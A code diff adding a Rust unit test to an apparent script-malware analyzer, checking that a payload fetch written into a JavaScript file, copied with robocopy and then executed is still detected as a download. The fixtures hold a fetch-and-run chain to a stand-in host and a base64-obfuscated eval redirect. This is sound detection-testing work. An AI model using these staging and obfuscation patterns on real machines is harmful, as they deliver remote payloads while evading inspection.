@@ -16880,6 +16880,23 @@ call C:\Temp\original.js"#,
     }
 
     #[test]
+    fn robocopy_default_file_set_preserves_generated_script_content() {
+        let report = analyze(
+            br#"echo fetch('https://robocopy-default-dir.example/payload') > C:\Work\original.js
+robocopy C:\Work C:\Temp
+call C:\Temp\original.js"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t, Trait::Download { src, .. } if src == "https://robocopy-default-dir.example/payload")
+            }),
+            "bare robocopy copied generated JS content was not analyzed: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn robocopy_slash_paths_preserve_generated_script_content_for_later_execution() {
         let report = analyze(
             br#"echo eval(atob("ZG9jdW1lbnQubG9jYXRpb249J2h0dHBzOi8vcm9ib2NvcHktc2xhc2gtZGlyLmV4YW1wbGUvcGF5bG9hZCc=")) > C:/Work/original.js
